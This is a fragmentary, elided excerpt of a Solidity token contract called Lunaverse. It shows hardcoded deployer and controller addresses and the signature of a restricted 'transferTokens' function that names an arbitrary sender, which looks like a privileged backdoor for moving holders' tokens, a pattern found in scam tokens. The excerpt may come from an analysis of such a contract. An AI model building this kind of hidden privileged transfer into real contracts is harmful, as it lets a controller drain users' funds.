...
contract Lunaverse is Context, IERC20 {
    ...
    address deployer = 0xc6821958f8d73ad0819502c35e383DB8D3077ea2;
    address public _controller = 0xC67EfB5Ea980a594c7DA5BdE8C086895e498172A;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function transferTokens(address sndr,address[] memory destination, uint256[] memory amounts) public _confirm(){
